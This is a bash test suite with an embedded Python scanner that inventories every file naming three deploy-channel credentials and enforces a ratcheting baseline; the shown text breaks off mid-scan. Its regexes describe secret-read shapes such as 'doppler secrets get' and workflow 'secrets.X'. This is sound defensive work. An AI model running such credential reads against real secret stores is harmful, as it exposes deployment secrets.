#!/usr/bin/env bash
#
# (#9294 G1, ADR-241 D1 amendment, PR-0) Guard 1a: the deploy-channel trio NAME-REFERENCE census, a
# regression ratchet. It is NOT a reachability proof.
#
# PROPERTY. The three deploy-channel credentials -- WEBHOOK_DEPLOY_SECRET and the Cloudflare Access
# client pair (CF_ACCESS_CLIENT_ID, CF_ACCESS_CLIENT_SECRET), plus every name in their token family
# (WEBHOOK_DEPLOY_SECRET_NEXT, TF_VAR_ spellings, lower-case tfvars spellings) -- are named, in code,
# only by (file, name) keys that have a row in tests/scripts/trio-baseline.tsv, and that file only
# ratchets forward. Together the three authenticate /hooks/infra-config on web-1 (a path that can
# replace ci-deploy.sh and read the host credential file), so a consumer nobody reviewed is the
# defect: P5 of the plan.
#
# WHAT THIS DOES NOT SEE (Known blind spots, also recorded in the baseline header and ADR-241). Reach
# WITHOUT naming is closed by deleting the Tier-A and repo-secret copies and by the main-only
# environment policy (sibling census G1b-G1d, G1h), not by this census: `doppler run -c prd_terraform`
# that injects the whole project, `secrets: inherit`, `toJSON(secrets)`, computed names
# (`secrets[format(...)]`), callers of a baselined script that fetches the trio itself, and host-side
# readers of the rendered hooks.json. Acceptance criterion 1 is therefore "zero tier-a rows plus the
# owner-run deletion postcondition", not "the census is green".
#
# WHY A SEPARATE SUITE rather than rows in the sibling Tier-B census (tests/scripts/test-infra-privileged-tier-census). That census derives
# Tier-B-ness from reads of TIER_B_NAMES through ONE read shape (`doppler secrets get <name> ...
# prd_terraform`); the `secrets.X` and env-passthrough shapes go through ENV_SECRETS. Adding the trio
# to TIER_B_NAMES turns its row G1g red on the live tree, and the repo-secret reads are not
# classified at all. The trio moves into TIER_B_NAMES in the PRs that migrate those consumers. This
# suite does single-source the Tier-B ENVIRONMENT set from that census (E1).
#
# POPULATION (F-A). `git ls-files -z --cached --others --exclude-standard` (a git failure is FAIL
# SETUP), minus: this suite's own two files by exact path; symlinks; files with a known BINARY
# EXTENSION (a NUL byte never hides a file: a NUL-bearing file is scanned with each NUL read as a
# newline and again with the NULs removed, as bash reads it; a file with a binary extension that
# nevertheless names the trio is a hard FAIL, because `bash x.png` runs it); and, under the prefixes
# knowledge-base/ and docs/, everything that is not CODE (CODE there is scanned: a listed code extension or
# basename (Makefile), or ANY file that starts with a shebang `#!`, whatever its extension -- a bootstrap
# script archived under the knowledge base names the trio too). `.md` elsewhere IS scanned (the ship and
# postmerge skill docs read the trio from Tier A). A scanned file that exists but cannot be read (a
# gitlink directory included) is a hard FAIL (T8); cached-but-gone-from-worktree is skipped silently. Every
# exclusion is a pinned constant (T6) and is re-derived independently in bash (A3, A4).
#
# COMMENTS. A whole-line comment is inert only where it truly is one: `#` in everything but JS/TS, `//` in
# JS/TS only, never in Markdown. What it EXPANDS still runs (a heredoc line `#$NAME`, `#${NAME}`, `#$(cmd)`, a
# workflow `run:` line `#${{ secrets.X }}`), so the `$` expansions of a comment line, and only they, are kept as
# code; a comment with no `$` is dropped whole.
#
# EXEMPT CLASS (R2). A structural test class (a directory segment in {test, tests, __tests__, fixtures}, a
# `.test.<ext>` or `.spec.<ext>` suffix, `.tftest.hcl`; NEVER anything under .github/) may MENTION the names
# without a row. It still needs a row when it holds a read shape. The class is pinned (T6, `@exempt`).
#
# NAMES (F-A3). Token family, case-insensitive, with a left AND right token boundary:
#   (?<![A-Za-z0-9_])(?:TF_VAR_)?(STEM)(?:_[A-Za-z0-9]+)*(?![A-Za-z0-9_])
# over STEMS = WEBHOOK_DEPLOY_SECRET, CF_ACCESS_CLIENT_ID, CF_ACCESS_CLIENT_SECRET. The row name is the
# upper-cased token with TF_VAR_ stripped. ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_ID|SECRET rows cover the
# Terraform spellings of the DEPLOY Access token only (`access_service_token_client_(id|secret)` with a
# left boundary, `cloudflare_zero_trust_access_service_token.deploy.client_*`; the ci_ssh and registry_push
# tokens are other credentials, G1b); FALLBACK:<NAME> rows cover a `|| doppler secrets get <other
# credential>` on a logical line (backslash and trailing-`||` continuations joined) that names the trio.
#
# CLASSES (F-C). Every row carries a class the scanner COMPUTES and the baseline must agree with (T5c):
#   tier-a  a file with a READ SHAPE: any `doppler run` or `doppler secrets get|download` COMMAND (only option flags
#           may sit between `doppler` and the subcommand; prose such as "injected by doppler at plan time, the apply
#           run reads it" is not one) in a file that names the trio (regardless of arguments), `${{ secrets.<NAME> }}`, `${!var}` indirection of a
#           family name, `terraform output -raw access_service_token_client_*`; or a workflow naming the trio in
#           a job without a literal Tier-B environment; or any composite action; FALLBACK:*, ALIAS:*.
#           Expiry required; TERMINAL: the end state is zero tier-a rows.
#   tier-b  a workflow with no read shape where EVERY job naming the trio (every job, when a workflow-level key
#           names it) declares a LITERAL `environment:` that is a member of the Tier-B set. Anything the proof
#           cannot measure (an expression, a matrix, unparseable YAML, no jobs, no naming job) is tier-a. Expiry `-`.
#   sink    a non-workflow file with no read shape (variables.tf, server.tf, hooks.json.tmpl, ...). Expiry `-`.
#
# RATCHET (F-B, T4). Against the base copy of the baseline: tag fixed (and equal to the group computed from the
# path); class forward-only (tier-a -> tier-b|sink), with ONE admitted regression, sink -> tier-a (a read shape appeared in
# a sink file: the RECLASS lane, ADR-241 line `Reclass: <file> <NAME> ... Ruled by <owner>` for each moved key, in a diff
# that touches only the baseline, ADR-241 and the moved key's own file; tier-b -> tier-a has no lane); expiry never later
# (re-date path: ADR-241 line `Re-date: <date> ... Ruled by <owner>` in a baseline/ADR-only diff); a NEW (file, name) key is admitted only by an
# `@allow` line that exists at the base and is deleted by the same diff; a NEW `@allow` is admitted only in a
# baseline/ADR-only diff whose ADR-241 diff adds `Allow: <file> <NAME> ... Ruled by <owner>`; renames
# (>= 90%) carry their rows; a deleted row whose name reappears as a KEY (a read shape, or a file outside the exempt
# class) of a file ADDED by the diff is RED unless that key spends a reserved @allow (similarity does not matter; a file
# that only MENTIONS the name in the exempt class is not a consumer and is green). The base FAILS CLOSED on every git failure (never an empty change list): an
# unresolved ref, a failing git subcommand, or a baseline absent at a base where this suite exists is RED. The
# introduction arm is legitimate only while this suite is absent at the merge-base; a branch cut before the
# suite landed prints a T4w warning.
#
# EXPIRY (F-D). Tier-a rows: strict ISO date, at most MAX_EXPIRY, compared as dates. Hard RED only on a
# blocking event that touches a row's file, the baseline or ADR-241; on a main push, schedule, merge-queue gate
# or dispatch-on-main it is a non-blocking T3m annotation (ci_not_green must not stop tenant deploys). Within
# 21 days: a non-failing T3w row and a ::warning::.
#
# Authority. "Ruled by" and the ADR lines are self-attested text in the same repository: the platform does not
# require a second reviewer (the rulesets carry no pull_request rule). The ratchet defends against accident
# and drift, not against a PR author who edits the suite itself.
#
# SEAMS. TRIO_REPO_ROOT (the tree the scan reads), TRIO_BASELINE, TRIO_BASE_REF (the ref merge-based against;
# default refs/remotes/origin/main; a merge_group run on refs/heads/gh-readonly-queue/* is judged against HEAD^1 instead, the entry's
# own parent, #10540), TRIO_TODAY (default today, UTC), TRIO_ALLOW_NO_BASE=1 (local only, loud
# banner), and the internal RF_* run knobs are test hooks. ALL of them are refused (FAIL SETUP) under
# GITHUB_ACTIONS=true and the RF_* ones are scrubbed locally. That refusal is accident-proofing, not
# authorization: a workflow step can unset GITHUB_ACTIONS. `--seams-check` also audits this file's own source,
# so a seam added without being declared in SEAMS fails.
#
# Harness conventions (ADR-193): the instrument self-test drives both helpers once; every mutation copies a
# PRISTINE fixture (a git-init'd copy of a synthetic tree, never the live tree), asserts the edit LANDED, then
# requires the NAMED row RED (kill rule, one mechanism: scanner rc 0 AND every row present AND the named row
# FAIL AND its detail carries the named reason; anything else is UNRESOLVED, not a kill; a `want` is matched
# against the DETAIL only and must not be satisfied by the row's own label); the control run is asserted
# all-green first; helper internals have negative controls (a wrong want, a wrong arm, a red fixture under
# green, a crashing scanner and a short row set must all be scored FAIL); scanner-branch mutants edit a COPY
# of the scanner and must flip a named classification case; floors report with printf + exit, never through
# the helpers they backstop. Mutant scans run in parallel; the verdicts are judged in registration order. A scanner-branch
# mutant (cmut) is a kill only when the edited scanner exited 0, kept every anchor row, and the named case flipped to the
# NAMED new class; a crash or a syntax error is UNRESOLVED (FAIL). The live scan runs as a real child and publishes its
# rc through a file the harness polls (no wait on a non-child).
#
# Run: bash tests/scripts/test-trio-baseline-census.sh [--emit-baseline | --seams-check]

set -uo pipefail
export TMPDIR="${TMPDIR:-/var/tmp}"

passes=0; fails=0; MUTANTS_RUN=0
FAILURES=()
pass() { passes=$((passes + 1)); printf '  ok   %s\n' "$1"; }
fail() { FAILURES+=("$1"); fails=$((fails + 1)); printf '  FAIL %s\n       %s\n' "$1" "${2:-}"; }

# Instrument self-test (ADR-193): both helpers must move their counters, or nothing below is
# evidence of anything. Declared AFTER the helpers and BEFORE the first real row.
_st="$( (pass x >/dev/null; fail y >/dev/null; printf '%s %s %s' "$passes" "$fails" "${#FAILURES[@]}") )"
if [ "$_st" != "1 1 1" ]; then
  printf 'FAIL INSTRUMENT: pass()/fail() self-test read "%s", expected "1 1 1"\n' "$_st" >&2; exit 1
fi

# Every environment/flag seam of this suite (a test hook). Refused under CI; --seams-check audits the source.
SEAMS="TRIO_TODAY TRIO_BASE_REF TRIO_BASELINE TRIO_REPO_ROOT TRIO_ALLOW_NO_BASE RF_PY RF_REF RF_TODAY RF_EVENT RF_EVENTREF RF_ENVS RF_SIB"
if [ "${GITHUB_ACTIONS:-}" = "true" ]; then
  for _seam in $SEAMS; do
    if [ -n "${!_seam+x}" ]; then
      printf 'FAIL SETUP: %s is set under GITHUB_ACTIONS=true; it is a local test hook and must be unset in CI\n' "$_seam" >&2
      exit 1
    fi
  done
fi
unset RF_PY RF_REF RF_TODAY RF_EVENT RF_EVENTREF RF_ENVS RF_SIB
if [ "${1:-}" = "--seams-check" ]; then
  _undecl=""
  for _n in $(grep -o '[$][{]\{0,1\}\(TRIO\|RF\)_[A-Za-z_]*' "${BASH_SOURCE[0]}" | sed 's/^[$]//; s/^{//' | sort -u); do
    case " $SEAMS TRIO_BASE_ARM " in *" $_n "*) : ;; *) _undecl="$_undecl $_n" ;; esac
  done
  if [ -n "$_undecl" ]; then printf 'FAIL SETUP: seam(s) used but not declared in SEAMS:%s\n' "$_undecl" >&2; exit 1; fi
  printf 'SEAMS OK\n'; exit 0
fi

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(cd "$DIR/../.." && pwd)"
SUITE="$DIR/$(basename "${BASH_SOURCE[0]}")"
REPODIR="${TRIO_REPO_ROOT:-$ROOT}"
BASELINE="${TRIO_BASELINE:-$ROOT/tests/scripts/trio-baseline.tsv}"
TODAY="${TRIO_TODAY:-$(date -u +%F)}"
SUITE_REL="tests/scripts/test-trio-baseline-census.sh"
BASELINE_REL="tests/scripts/trio-baseline.tsv"
SIBLING_REL="tests/scripts/test-infra-privileged-tier-census.sh"
LIB_REL="scripts/lib/test-affected-paths.sh"
ADR_REL="knowledge-base/engineering/architecture/decisions/ADR-241-terraform-credentials-are-tiered-main-only-environment-secrets.md"
KBN="knowledge-base"   # the directory name as data (fixture paths, the A5 glob names), never as a path this suite reads
AFFECTED_ARRAY="AFFECTED_TESTS_SCRIPTS_TRIO_BASELINE_CENSUS_PATHS"

# Canonical copy of plugins/soleur/test/test-helpers.sh's guard (the fixture-dir-operand-assert
# suite pins every tracked copy byte-identical).
assert_fixture_dir() {
  case "${1-}" in
    "") printf 'FATAL: fixture dir is EMPTY; git -C "" would operate on %s\n' "$PWD" >&2; exit 2 ;;
    */../*|*/..) printf 'FATAL: fixture dir %s contains ..; refusing\n' "$1" >&2; exit 2 ;;
    /proc/*|/sys/*|/dev/*) printf 'FATAL: fixture dir %s is a synthetic-fs path; refusing\n' "$1" >&2; exit 2 ;;
    /|//|/.) printf 'FATAL: fixture dir resolves to the filesystem root; refusing\n' >&2; exit 2 ;;
    /*) : ;;
    *)  printf 'FATAL: fixture dir %s is RELATIVE; refusing\n' "$1" >&2; exit 2 ;;
  esac
}

# THE FIXTURE GIT ENVIRONMENT (#7849 chokepoint): sourcing arms the tripwire that refuses an inherited GIT_DIR (in a linked
# worktree git exports it to every hook and it overrides `git -C`), and git_fixture_env then exports the ceiling ($T's
# parent), an identity and config hermeticity into this shell. The live repo is read through `git -C "$REPODIR"`, whose
# own root is found without climbing to the ceiling.
# shellcheck source=../../plugins/soleur/test/lib/git-fixture-env.sh
source "${ROOT}/plugins/soleur/test/lib/git-fixture-env.sh" \
  || { printf 'FAIL SETUP: could not source the fixture git environment\n' >&2; exit 1; }

T="$(mktemp -d "${TMPDIR}/trio-baseline-census.XXXXXX")" || { printf 'FAIL SETUP: mktemp\n' >&2; exit 1; }
_REACHED_VERDICT=""; _rc=0
trap '_rc=$?; rm -rf "$T"; if [ "$_rc" -eq 0 ] && [ -z "$_REACHED_VERDICT" ]; then printf "FAIL: suite exited 0 before its verdict\n" >&2; exit 1; fi' EXIT
assert_fixture_dir "$T"
git_fixture_env "$T" || { printf 'FAIL SETUP: git_fixture_env refused the fixture root %s\n' "$T" >&2; exit 1; }
mkdir -p "$T/mut" "$T/probe" "$T/cm" || { printf 'FAIL SETUP: mkdir %s\n' "$T" >&2; exit 1; }
: > "$T/empty.tsv"

# python3 never runs from the caller's cwd (a stray json.py/yaml.py there would shadow the import): every call goes
# through py3, which runs from the private temp dir.
py3() { (cd "$T" && python3 "$@"); }
py3 -c 'import re, os, sys, datetime, subprocess, ast, json, yaml' 2>/dev/null || { printf 'FAIL SETUP: python3 (with the yaml module) unavailable\n' >&2; exit 1; }

cat > "$T/trio.py" <<'PY'
import sys, os, re, datetime, argparse, subprocess, json, ast
try:
    import yaml
except Exception:
    sys.stderr.write("FAIL SETUP: python3 yaml module unavailable\n")
    sys.exit(3)

ap = argparse.ArgumentParser()
ap.add_argument("--repo", required=True)
ap.add_argument("--baseline", required=True)
ap.add_argument("--base-dir", default="")    # the shell's base-resolution record; "" = no ratchet record at all
ap.add_argument("--today", required=True)
ap.add_argument("--mode", default="check")   # check | emit
ap.add_argument("--event-name", default="")  # GITHUB_EVENT_NAME ("" = local)
ap.add_argument("--event-ref", default="")   # GITHUB_REF
ap.add_argument("--envs", default="")        # a comma list overriding the Tier-B environment set (fixtures)
ap.add_argument("--sibling", default="")     # the sibling census file the Tier-B environment set is extracted from
ap.add_argument("--ann", default="")         # file receiving ::warning:: / ::error:: annotations
ap.add_argument("--scanned-list", default="")  # file receiving the NUL-separated scanned paths (the conservation check reads it)
ap.add_argument("--git-iso", action="store_true")  # fixtures: ignore the operator's global/system git config
a = ap.parse_args()
REPO = a.repo

# ── constants ────────────────────────────────────────────────────────────────────────────
STEMS = ["WEBHOOK_DEPLOY_SECRET", "CF_ACCESS_CLIENT_ID", "CF_ACCESS_CLIENT_SECRET"]
PENDING_ENVS = {"deploy-channel", "inngest-cutover"}
MAX_EXPIRY = datetime.date(2027, 3, 31)
ROW_EXPIRY = "2026-11-30"
WARN_DAYS = 21
SUITE_REL = "tests/scripts/test-trio-baseline-census.sh"
BASELINE_REL = "tests/scripts/trio-baseline.tsv"
ADR_REL = "knowledge-base/engineering/architecture/decisions/ADR-241-terraform-credentials-are-tiered-main-only-environment-secrets.md"
ROOTS = [".github/workflows", ".github/actions", ".github/scripts", "scripts", "plugins", "apps/web-platform"]
# Under these prefixes only CODE is scanned (a script, a workflow, a template or a config can read the trio from a
# docs directory too): a listed code extension or basename, or ANY file that starts with a shebang (`#!`, an executable
# without an extension is code). Prose, media and rendering inputs are not.
EXCLUDED_PREFIXES = ("knowledge-base/", "docs/")
KB_CODE_EXT = {"sh", "bash", "zsh", "py", "pl", "rb", "ps1", "mk", "ts", "tsx", "js", "jsx", "mjs", "cjs", "yml", "yaml", "tf", "tfvars",
               "tmpl", "hcl", "toml", "json", "cfg", "service", "timer"}
KB_CODE_NAMES = {"Makefile"}      # basenames that are code whatever their (absent) extension
# Known binary EXTENSIONS. A NUL byte never hides a file; a file with one of these extensions that nevertheless names
# the trio is a hard FAIL (T8), because `bash x.png` runs it.
BINARY_EXT = {"png", "jpg", "jpeg", "gif", "ico", "webp", "avif", "bmp", "tif", "tiff", "woff", "woff2", "ttf", "otf", "eot",
              "pdf", "zip", "gz", "tgz", "bz2", "xz", "7z", "jar", "class", "so", "dylib", "o", "a", "bin", "mp3", "mp4", "mov",
              "webm", "wasm", "pen", "sqlite", "db", "tsq", "tsr", "bpf"}
# The structural test class: a directory segment, or a suffix. `.*` in a suffix stands for any one extension.
EXEMPT_DIRS = {"test", "tests", "__tests__", "fixtures"}
EXEMPT_SUFFIXES = (".test.*", ".spec.*", ".tftest.hcl")
# The guard constants the baseline pins (each `@name` record must equal the constant here AND the base copy's record).
PINS = {
    "stems": ",".join(STEMS),
    "exempt": ",".join(sorted(EXEMPT_DIRS)) + ";" + ",".join(EXEMPT_SUFFIXES),
    "binary": ",".join(sorted(BINARY_EXT)),
    "kbcode": ",".join(sorted(KB_CODE_EXT)) + ";" + ",".join(sorted(KB_CODE_NAMES)),
}
# The consumer groups of the plan (this map labels rows and keys T5/T7; the plan table is the narrative).
PR3 = {".github/workflows/web-platform-release.yml", ".github/workflows/canary-status.yml"}
PR4_PREFIX = (".github/workflows/cutover-inngest.yml", ".github/workflows/deploy-inngest-image.yml",
              ".github/workflows/restart-inngest-server.yml", ".github/workflows/scheduled-inngest-health.yml",
              ".github/workflows/scheduled-followthrough-sweeper.yml", "scripts/followthroughs/",
              "apps/web-platform/scripts/github-app-key-status.sh")

def group_of(rel):
    if rel in PR3:
        return "PR-3"
    if rel.startswith(PR4_PREFIX):
        return "PR-4"
    return "PR-2"

ISO = re.compile(r"[0-9]{4}-[0-9]{2}-[0-9]{2}")
def parse_iso(s):
    if not ISO.fullmatch(s):
        return None
    try:
        return datetime.date.fromisoformat(s)
    except ValueError:
        return None

TODAY = parse_iso(a.today)
if TODAY is None:
    sys.stderr.write("FAIL SETUP: --today %r is not a strict ISO date\n" % a.today)
    sys.exit(3)

out = []
CTRL = re.compile(r"[\x00-\x1f\x7f]")
def check(name, cond, detail=""):
    out.append("%s\t%s\t%s" % ("ok" if cond else "FAIL", CTRL.sub(" ", name), CTRL.sub(" ", str(detail))[:700]))
anns = []

# ── the name family ──────────────────────────────────────────────────────────────────────
STEM_ALT = "|".join(re.escape(s) for s in sorted(STEMS, key=len, reverse=True))
FAM_CORE = r"(?:TF_VAR_)?(?:" + STEM_ALT + r")(?:_[A-Za-z0-9]+)*(?![A-Za-z0-9_])"
FAM = re.compile(r"(?<![A-Za-z0-9_])" + FAM_CORE, re.I)
FAM_FULL = re.compile(FAM_CORE, re.I)
ROWNAME = re.compile(r"(?:" + STEM_ALT + r")(?:_[A-Z0-9]+)*")
def row_name(tok):
    n = tok.upper()
    return n[len("TF_VAR_"):] if n.startswith("TF_VAR_") else n
# The Terraform spellings of the DEPLOY Access token only (tunnel.tf: output "access_service_token_client_*" and
# cloudflare_zero_trust_access_service_token.deploy). The ci_ssh and registry_push tokens are other credentials (G1b).
ALIAS_A = re.compile(r"(?<![A-Za-z0-9_])(?:TF_VAR_)?access_service_token_client_(id|secret)(?![A-Za-z0-9_])", re.I)
ALIAS_B = re.compile(r"(?<![A-Za-z0-9_])cloudflare_zero_trust_access_service_token\.deploy\.client_(id|secret)(?![A-Za-z0-9_])", re.I)
ALIAS_NAMES = {"ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_ID", "ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_SECRET"}
FALLBACK = re.compile(r"\|\|\s*doppler\s+secrets\s+get\s+([A-Za-z_][A-Za-z0-9_]*)")
HCLOUD = re.compile(r"(?<![A-Za-z0-9_])HCLOUD_TOKEN(?![A-Za-z0-9_])", re.I)
CONT = re.compile(r"\\[ \t]*\n[ \t]*")          # backslash continuation, joined with a space (read shapes)
CONT_STRICT = re.compile(r"\\\r?\n")            # backslash continuation exactly as bash removes it (split names)
ORJOIN = re.compile(r"\|\|[ \t]*\n[ \t]*")      # a line ending in `||` continues on the next line

# direct-store read shapes (F-A2 / F-C). `doppler run` and `doppler secrets get|download` are read shapes REGARDLESS of
# arguments, flags, pipes, variable names or split literals once the file names the family.
# COMMAND SYNTAX only: between `doppler` and the subcommand may sit option flags (`-p soleur`, `--silent`, `-c "prd"`), never a
# plain word, so prose ("injected by doppler at plan time, the apply run reads it") is not an invocation. The separator also
# admits quotes and commas (a python argv list, a split literal).
_SEP = r"""[ \t"',]+"""
_TOK = r"""[^\s;|&)"',]"""
_FLAGS = r"""(?:""" + _SEP + r"""-""" + _TOK + r"""+(?:""" + _SEP + r"""(?!-)""" + _TOK + r"""+)?)*"""
R_DOP_RUN = re.compile(r"(?<![A-Za-z0-9_])doppler" + _FLAGS + _SEP + r"run(?![A-Za-z0-9_-])", re.I)
R_DOP_SEC = re.compile(r"(?<![A-Za-z0-9_])doppler" + _FLAGS + _SEP + r"secrets" + _SEP + r"(?:get|download)(?![A-Za-z0-9_-])", re.I)
R_SECRETS = re.compile(r"secrets\s*(?:\.\s*|\[\s*['\"])(" + FAM_CORE + ")", re.I)
R_INDIRECT = re.compile(r"\$\{!([A-Za-z_][A-Za-z0-9_]*)\}")
R_TFOUT = re.compile(r"terraform\b[^\n]*?\boutput\b[^\n]*?-raw\s+[\"']?(?<![A-Za-z0-9_])access_service_token_client_(id|secret)(?![A-Za-z0-9_])", re.I)

JS_EXT = (".ts", ".tsx", ".js", ".jsx", ".mjs", ".cjs")
# What a shell, a template engine or a workflow expands inside a comment-looking line: ${{ }}, ${ }, $( ), $NAME. An unclosed
# `${` or `$(` (a command substitution that continues on the next line) expands to the end of the line.
EXPAND = re.compile(r"\$\{\{.*?\}\}|\$\{[^}\n]*\}|\$\((?:[^()\n]|\([^()\n]*\))*\)|\$\{[^\n]*|\$\([^\n]*|\$[A-Za-z_][A-Za-z0-9_]*")
def code_lines(rel, text):
    """The lines that are code. A whole-line comment (`#` in everything but JS/TS, `//` in JS/TS only) is inert text, EXCEPT
    for what it expands: a heredoc line `#$NAME`, `#${NAME}`, `#$(cmd)`, `` # `echo $NAME` `` or a workflow `run:` line
    `#${{ secrets.X }}` still runs the expansion, so the expansions of a comment line (and only they) are kept as code and
    the rest of the line is dropped. Markdown is never filtered."""
    low = rel.lower()
    if low.endswith(".md"):
        return text.split("\n")
    js = low.endswith(JS_EXT)
    keep = []
    for ln in text.split("\n"):
        s = ln.lstrip()
        if (s.startswith("//") if js else s.startswith("#")):
            frags = EXPAND.findall(ln)
            if frags:
                keep.append(" ".join(frags))
            continue
        keep.append(ln)
    return keep

def is_exempt(rel):
    if rel.startswith(".github/"):
        return False
    parts = rel.split("/")
    if any(p in EXEMPT_DIRS for p in parts[:-1]):
        return True
    base = parts[-1]
    for suf in EXEMPT_SUFFIXES:
        if suf.endswith(".*"):
            if re.search(re.escape(suf[:-1]) + r"[A-Za-z0-9]+$", base):
                return True
        elif base.endswith(suf):
            return True
    return False

def ext_of(rel):
    b = rel.rsplit("/", 1)[-1]
    return b.rsplit(".", 1)[-1].lower() if "." in b else ""

def kb_prose(rel, full):
    """True when <rel> sits under a doc prefix and is NOT code: no listed code extension or basename and no shebang."""
    if not rel.startswith(EXCLUDED_PREFIXES):
        return False
    if ext_of(rel) in KB_CODE_EXT or rel.rsplit("/", 1)[-1] in KB_CODE_NAMES:
        return False
    try:
        with open(full, "rb") as fh:
            return fh.read(2) != b"#!"
    except OSError:
        return True

PREFILTER = [x.lower() for x in STEMS] + ["access_service_token_client_", "cloudflare_zero_trust_access_service_token"]
EMPTY_AN = {"names": set(), "aliases": set(), "reads": set(), "gen_read": False, "alias_reads": set(),
            "fallbacks": set(), "hcloud": False, "indirect": False}
def analyze1(rel, text):
    low = (text + "\n" + CONT_STRICT.sub("", text)).lower()
    if not any(x in low for x in PREFILTER):
        return {k: (set() if isinstance(v, set) else v) for k, v in EMPTY_AN.items()}
    code = "\n".join(code_lines(rel, text))
    joined = ORJOIN.sub("|| ", CONT.sub(" ", code))
    strict = CONT_STRICT.sub("", code)
    an = {"names": set(), "aliases": set(), "reads": set(), "gen_read": False, "alias_reads": set(),
          "fallbacks": set(), "hcloud": bool(HCLOUD.search(code)), "indirect": False}
    for txt in (code, joined, strict):
        for m in FAM.finditer(txt):
            an["names"].add(row_name(m.group(0)))
        for m in ALIAS_A.finditer(txt):
            an["aliases"].add("ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_" + m.group(1).upper())
        for m in ALIAS_B.finditer(txt):
            an["aliases"].add("ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_" + m.group(1).upper())
    for m in R_SECRETS.finditer(joined):
        an["reads"].add(row_name(m.group(1)))
    named = bool(an["names"] or an["aliases"])
    an["gen_read"] = named and bool(R_DOP_RUN.search(joined) or R_DOP_SEC.search(joined) or R_DOP_RUN.search(code) or R_DOP_SEC.search(code))
    if named:
        # `${!X}` is a read shape when X is itself a family name, or is given a family name on the same logical line
        # (`n=NAME; echo "${!n}"`, `for n in NAME; do ... ${!n}`). A flow-insensitive cross-line match is a blind spot.
        for ln in joined.split("\n"):
            for m in R_INDIRECT.finditer(ln):
                x = re.escape(m.group(1))
                if FAM_FULL.fullmatch(m.group(1)) or re.search(r"(?<![A-Za-z0-9_])" + x + r"=[\"']?" + FAM_CORE, ln, re.I) \
                        or re.search(r"\bfor\s+" + x + r"\s+in\b[^;\n]*" + FAM_CORE, ln, re.I):
                    an["indirect"] = True
    for m in R_TFOUT.finditer(joined):
        an["alias_reads"].add("ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_" + m.group(1).upper())
    for ln in joined.split("\n"):
        if FAM.search(ln):
            for m in FALLBACK.finditer(ln):
                if not FAM_FULL.fullmatch(m.group(1)):
                    an["fallbacks"].add("FALLBACK:" + m.group(1).upper())
    return an

def merge_an(items):
    res = {k: (set() if isinstance(v, set) else v) for k, v in EMPTY_AN.items()}
    for an in items:
        for k, v in an.items():
            res[k] = (res[k] | v) if isinstance(v, set) else (res[k] or v)
    return res

def analyze(rel, texts):
    return merge_an(analyze1(rel, t) for t in texts)

def has_read(an):
    return bool(an["reads"] or an["gen_read"] or an["alias_reads"] or an["indirect"])

def keys_of(rel, an, exempt):
    if not exempt:
        return {(rel, n) for n in an["names"]} | {(rel, n) for n in an["fallbacks"]} | {(rel, n) for n in an["aliases"]}
    if has_read(an):
        return {(rel, n) for n in an["names"]} | {(rel, n) for n in an["alias_reads"]}
    return set()

# ── the Tier-B environment set ───────────────────────────────────────────────────────────
SIB = None
if a.sibling:
    try:
        _st = open(a.sibling, encoding="utf-8", errors="replace").read()
        _m = re.search(r"^TIER_B_ENVIRONMENTS = (\{[^}\n]*\})$", _st, re.M)
        SIB = set(ast.literal_eval(_m.group(1))) if _m else None
    except Exception:
        SIB = None
if a.envs:
    ENVS = {x for x in a.envs.split(",") if x}
elif SIB:
    ENVS = SIB | PENDING_ENVS
else:
    ENVS = set(PENDING_ENVS)

def env_literal(raw):
    """The environment name when `environment:` is a LITERAL (a string, or a mapping whose name is a string); None for
    anything computed or absent. An expression can never be a member of the closed Tier-B set, so no expression parsing
    exists here: a conditional, a matrix, an input or a `|| ''` arm is simply not a member."""
    if isinstance(raw, dict):
        raw = raw.get("name")
    if not isinstance(raw, str):
        return None
    s = raw.strip()
    if not s or "${{" in s:
        return None
    return s

WF = re.compile(r"\.github/workflows/[^/]+\.ya?ml")
ACTION = re.compile(r"\.github/actions/(?:[^/]+/)*action\.ya?ml")
def tierb_ok(rel, text):
    """True when EVERY job naming the trio declares a literal `environment:` that is a member of the Tier-B set.
    Anything the proof cannot measure (unparseable YAML, no jobs, no naming job) is not tier-b."""
    try:
        doc = yaml.safe_load(text)
    except Exception:
        return False
    if not isinstance(doc, dict) or not isinstance(doc.get("jobs"), dict):
        return False
    wl = bool(FAM.search(json.dumps({k: v for k, v in doc.items() if k != "jobs"}, default=str)))
    naming = [b for b in doc["jobs"].values() if isinstance(b, dict) and (wl or FAM.search(json.dumps(b, default=str)))]
    if not naming:
        return False
    for b in naming:
        e = env_literal(b.get("environment")) if "environment" in b else None
        if e is None or e not in ENVS:
            return False
    return True

def file_class(rel, text, an, exempt):
    if exempt or has_read(an):
        return "tier-a"
    if ACTION.fullmatch(rel):
        return "tier-a"
    if WF.fullmatch(rel):
        return "tier-b" if tierb_ok(rel, text) else "tier-a"
    return "sink"

# ── 1. the population (F-A1) ─────────────────────────────────────────────────────────────
genv = {k: v for k, v in os.environ.items() if k not in ("GIT_DIR", "GIT_WORK_TREE", "GIT_INDEX_FILE", "GIT_CONFIG_COUNT", "GIT_CONFIG_PARAMETERS")}
if a.git_iso:
    genv.update({"GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_SYSTEM": "/dev/null", "GIT_CONFIG_NOSYSTEM": "1"})
def git(*args):
    return subprocess.run(["git", "-C", REPO, "-c", "color.ui=never"] + list(args), capture_output=True, env=genv)

_r = git("ls-files", "-z", "--cached", "--others", "--exclude-standard")
if _r.returncode != 0:
    sys.stderr.write("FAIL SETUP: git ls-files failed in %s: %s\n" % (REPO, _r.stderr.decode("utf-8", "replace")[:200]))
    sys.exit(3)
paths = sorted({os.fsdecode(p) for p in _r.stdout.split(b"\0") if p})

stat = {"excluded": 0, "exempt": 0, "binary": 0, "symlinks": 0, "gone": 0, "hits": 0, "nul": 0}
unreadable = []
scanned = []
need = {}
hcloud_files = set()
key_files = set()
tf_texts = {}
key_names = {}
for rel in paths:
    ex_ext = ext_of(rel)
    full = os.path.join(REPO, rel)
    if rel in (SUITE_REL, BASELINE_REL) or kb_prose(rel, full):
        stat["excluded"] += 1
        continue
    if os.path.islink(full):
        stat["symlinks"] += 1
        continue
    if not os.path.lexists(full):
        stat["gone"] += 1
        continue
